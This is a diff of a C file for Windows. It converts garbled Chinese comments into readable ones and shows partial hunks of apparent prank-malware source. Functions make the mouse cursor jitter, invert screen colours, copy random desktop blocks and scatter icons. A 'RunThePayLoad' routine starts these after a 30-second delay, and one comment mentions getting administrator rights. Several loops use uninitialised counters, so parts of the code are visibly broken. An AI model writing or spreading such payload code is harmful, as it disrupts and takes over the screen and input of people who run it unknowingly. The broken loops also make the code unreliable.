@@ -1,45 +1,45 @@
-//C��ԭ����ͷ�ļ�
+//C的原生的头文件
 #include<stdio.h>
 #include<stdlib.h>
 #include<string.h>
 
-//�����ļ���ͷ�ļ�
+//操作文件的头文件
 #include<dirent.h>
 #include<direct.h>
 
-//���̺߳Ͷ���̵����ļ�
+//多线程和多进程的有文件
 #include<process.h>
 
-//ʹ��WindowsAPI��ȡ����ԱȨ��
+//使用WindowsAPI获取管理员权限
 #include<Windows.h>
 
-//�����ָ�붶��
+//让鼠标指针抖动
 void TheMouseDance(void* p){
     POINT point;
     GetCursorPos(&point);
-    //�����ƶ�
+    //向左移动
     for (int i; i < 200; i++) {
         GetCursorPos(&point);
         SetCursorPos(point.x - 3, point.y);
     }
-    //�����ƶ�
+    //向下移动
     for (int i; i < 200; i++) {
         GetCursorPos(&point);
         SetCursorPos(point.x, point.y + 3);
     }
-    //�����ƶ�
+    //向右移动
     for (int i; i < 200; i++) {
         GetCursorPos(&point);
         SetCursorPos(point.x + 3, point.y);
     }
-    //�����ƶ�
+    //向上移动
     for (int i; i < 200; i++) {
         GetCursorPos(&point);
         SetCursorPos(point.x, point.y - 3);
     }
 }
 
-//���ָ���ϵ�ͼ��
+//鼠标指针上的图标
 void TheMouseDraw(void* p) {
     while (1) {
         POINT point;
@@ -81,7 +81,7 @@ void TheMouseDraw(void* p) {
     }
 }
 
-    //��Ļ��ɫ
+    //屏幕反色
 void TheDesktopColorErr(void* p) {
     HWND hWnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hWnd);
@@ -94,7 +94,7 @@ void TheDesktopColorErr(void* p) {
     }
 }
 
-    //�����С�ķ��鸴��
+    //随机大小的方块复制
 void TheDisPlayDeskCopy(void* p) {
     HWND hWnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hWnd);
@@ -113,7 +113,7 @@ void TheDisPlayDeskCopy(void* p) {
     }
 }
 
-    //�����λ������ͼ��
+    //在随机位置生成图标
 void TheIconRandSummon(void* p) {
     HWND hWnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hWnd);
@@ -157,7 +157,7 @@ void TheIconRandSummon(void* p) {
 
 void RunThePayLoad(void) {
     Sleep(30000);
-    //��������
+    //启动程序
     _beginthread(TheMouseDance, 0, NULL);
     _beginthread(TheMouseDance, 0, NULL);
     _beginthread(TheIconRandSummon, 0, NULL);
